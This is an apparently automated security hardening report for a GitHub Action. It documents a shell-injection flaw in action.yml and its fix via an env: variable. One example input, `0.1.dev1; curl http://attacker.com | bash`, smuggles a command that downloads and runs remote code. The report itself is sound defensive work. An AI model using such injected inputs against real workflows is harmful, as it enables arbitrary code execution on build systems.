<!-- markdownlint-disable -->

# Hardening Report: fabasoad--setup-brainfuck-action/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **fabasoad--setup-brainfuck-action/v1.1.0** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in action.yml directly interpolates `${{ inputs.version }}` into a shell command string: `pip3 install brainfucky==${{ inputs.version }}`. The Actions runner performs this substitution before the shell parses the command, so a caller supplying a crafted version string (e.g. `0.1.dev1; curl http://attacker.com | bash`) can execute arbitrary shell commands. The fix is to pass the value through an `env:` variable and double-quote it: set `env: VERSION: ${{ inputs.version }}` and use `pip3 install "brainfucky==$VERSION"` in the run block.

Locations:

- `action.yml:15`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install Brainfuck"; move to env: map

Locations:

- `action.yml:18`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed script injection vulnerability in action.yml by moving `${{ inputs.version }}` out of the run: shell string and into an `env:` block as `VERSION: ${{ inputs.version }}`. The shell command was updated from `pip3 install brainfucky==${{ inputs.version }}` to `pip3 install "brainfucky==$VERSION"`, ensuring the value is passed through an environment variable and properly double-quoted, preventing arbitrary shell command execution via crafted version strings.

